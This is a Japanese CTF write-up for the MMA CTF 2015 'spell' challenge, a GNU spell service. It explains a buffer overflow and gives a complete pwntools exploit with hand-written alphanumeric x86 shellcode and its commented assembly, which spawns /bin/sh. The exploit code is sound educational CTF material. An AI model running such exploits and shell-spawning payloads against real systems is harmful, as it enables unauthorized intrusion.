---
layout: post
redirect_from:
  - /writeup/ctf/2015/mma-ctf-2015-spell/
  - /blog/2016/03/01/mma-ctf-2015-spell/
date: 2016-03-01T10:59:57+09:00
tags: [ "ctf", "writeup", "pwn", "mmactf", "shellcode", "buffer-overflow", "alphanumeric-shellcode" ]
---

# MMA CTF 2015: spell

初めての手書きshellcodeだった。alphanumericなshellcodeはctfをやる目的のひとつだったので書けてよかった。

でも、後はshellcodeだけ、というところまで持っていく部分の能力はなかったので、そこは他の人のwriteupを見ました。

## [spell](https://github.com/ctfs/write-ups-2015/tree/master/mma-ctf-2015/pwn/spell-300)

``` sh
$ ./saas-stripped
       ----                        /   /
      /                           /   /
     |        ____     ____      /   /
      \      /    \   /    \    /   /
       \    /_____/  /_____/   /   /
       /   /        /         /   /
  ____/   /         \_____   /   /   as a service

GNU Spell 1.1
Copyright (C) 1996,2010 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

spell: Ispell version 3.3.02
Input your paragraph: foo is a bar of baz
Misspelled:
foo
baz
Input your paragraph: is a of      
Perfect!
```

[GNU spell](http://savannah.gnu.org/projects/spell/) as a service。`spell`は`ispell`のwrapper。alphanumericな1行を受け取りそれを`spell`に渡すloopがあり、`spell`から何も文句が出てこなければ終了する。

### 攻撃

`spell`からの応答にbofがある。

使える文字がalphanumericのみで末尾には改行があるので、mainへの戻り先アドレスを半分書き換えて`ret`があるアドレスへ向ける。これを踏むのは`spell`を通過する文字列を提出した直後。後ろには引数であったbufferのアドレスが控えているので、bufferに飛ぶことになる。

DEPはないのでshellcodeを置けばよい。しかしalphanumericでかつ`spell`を通過するものでないといけないので、頑張って書く。
単独の文字は`spell`を通過し数字は空白文字と同じ動きをするので、各命令を`40`(`xor al, 0x30`)で区切れば、`spell`の通過という条件はだいたいなんとかなる。
普通のx86 alphanumeric shellcodeの書きかたはももテクが詳しいのでその通りにやればよい。

### 参考

-   [x86 alphanumeric shellcodeを書いてみる - ももいろテクノロジー](http://inaz2.hatenablog.com/entry/2014/07/11/004655)
-   <https://gist.github.com/Bono-iPad/42434cdfff084c637d3b#spell>
-   <http://charo-it.hatenablog.jp/entry/2015/09/08/005012>

### 実装

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()
context.log_level = 'debug'

p = remote(args.host, args.port)
# p = process('./saas-stripped')

p.recvuntil('Input your paragraph: ')
ret = 0x80a485a # '\x08\nHZ'
p.sendline('A' * 4079 + 'ZH')

p.recvuntil('Input your paragraph: ')
shellcode = 'P40Y40P40P40P40P40h0000X404050000P40Q40a40V40Z40J40h R80X55948P40T40h9048Y40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40A40Q40X59l00P40T40Y01A01V40T40Y4001Y40Q40I40I40I40I40I40I40I40I40I40I40I40I40Q40X40Y400DO0T40T40X40Y40000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000' # nasm a.asm -o /dev/stdout
p.sendline(shellcode)

time.sleep(0.5)
p.sendline('ls')
p.interactive()
```

``` asm
bits 32

_start:
    push eax
    xor al, 0x30
    pop ecx
    xor al, 0x30 ; mov ecx, eax

    push eax ; eax
    xor al, 0x30
    push eax ; ecx
    xor al, 0x30
    push eax ; ebx
    xor al, 0x30
    push eax ; ebp
    xor al, 0x30

    push 0x30303030
    pop eax
    xor al, 0x30
    xor al, 0x30
    xor eax, 0x30303030 ; xor eax, eax

    push eax ; esi, 0x00000000
    xor al, 0x30
    push ecx ; edi, buffer addr
    xor al, 0x30
    popad ; set registers
    xor al, 0x30

    push esi
    xor al, 0x30
    pop edx
    xor al, 0x30
    dec edx
    xor al, 0x30 ; mov edx, 0xffffffff

    ; 0x80c6b15 "/bin/sh"
    ; $ strings -tx saas-stripped | grep /bin/sh #=>  7eb15 /bin/sh
    ; >>> hex(0x30385220 ^ 0x38343935) #=> '0x80c6b15'
    push 0x30385220
    pop eax
    xor eax, 0x38343935
    push eax
    xor al, 0x30

    push esp
    xor al, 0x30

    ; 0x804a390 <system>
    ; >>> hex(0x30306c39 ^ 0xffff ^ (0x38343039 + 0x1d)) #=> '0x804a390'
    push 0x38343039
    pop ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    inc ecx
    xor al, 0x30
    push ecx
    xor al, 0x30
    pop eax
    xor eax, 0x30306c39
    push eax
    xor al, 0x30
    push esp
    xor al, 0x30
    pop ecx
    xor [ecx], dh
    inc ecx
    xor [ecx], dh

    ; c3 ret
    ; >>> hex(0xf3 ^ 0x30) #= '0xc3'
    push esi
    xor al, 0x30
    push esp
    xor al, 0x30
    pop ecx
    xor al, 0x30
    xor [ecx], dh
    pop ecx ; mov ecx, 0xff
    xor al, 0x30
    push ecx ; dup
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx
    xor al, 0x30
    dec ecx ; mov ecx, 0xf3
    xor al, 0x30
    push ecx
    xor al, 0x30
    pop eax ; mov eax, ecx
    xor al, 0x30
    pop ecx ; mov ecx, 0xff
    xor al, 0x30
    xor [edi+2*ecx+0x30], al ; DO is a valid word

    push esp
    xor al, 0x30
    push esp
    xor al, 0x30
    pop eax ; set dummy
    xor al, 0x30
    pop ecx
    xor al, 0x30

    ; 0x30 xor [eax], dh
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30 ; one of them will be 0xc3 ret
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
    db 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30
```
